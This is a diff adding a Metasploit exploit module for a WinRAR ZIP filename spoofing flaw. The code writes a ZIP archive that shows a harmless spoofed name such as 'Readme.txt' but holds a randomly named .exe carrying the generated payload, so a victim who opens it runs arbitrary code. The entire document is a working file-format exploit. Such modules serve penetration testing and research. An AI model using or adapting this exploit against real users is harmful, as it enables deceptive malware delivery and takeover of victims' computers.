@@ -1,0 +1,72 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex/zip'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'WinRAR Filename Spoofing',
+      'Description'    => %q{
+        This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists
+        when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from
+        the central directory, but the file names used to extract and open contents come from the
+        Local File Header. This inconsistency allows to spoof file names when opening ZIP files
+        with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in
+        March 2014
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'chr1x', # Vulnerability discoverer according to OSVDB
+          'juan vazquez' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'OSVDB', '62610' ],
+          [ 'BID', '66383' ],
+          [ 'URL', 'http://securityaffairs.co/wordpress/23623/hacking/winrar-zero-day.html'],
+          [ 'URL', 'http://an7isec.blogspot.co.il/']
+        ],
+      'Platform'          => [ 'win' ],
+      'Payload'           =>
+        {
+          'DisableNops' => true,
+          'Space' => 4096
+        },
+      'Targets'        =>
+        [
+          [ 'Windows Universal', {} ]
+        ],
+      'DisclosureDate' => 'Sep 28 2009',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('SPOOF', [ true, 'The spoofed file name to show', 'Readme.txt']),
+        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip'])
+      ], self.class)
+
+  end
+
+  def exploit
+    exe_filename = rand_text_alpha(rand(6) + 1)
+    exe_filename << ".exe"
+
+    zip = Rex::Zip::Archive.new
+    zip.add_file(exe_filename, generate_payload_exe, nil, nil, datastore['SPOOF'])
+    pack = zip.pack
+
+    print_status("Creating '#{datastore['FILENAME']}' file...")
+    file_create(pack)
+  end
+
+end
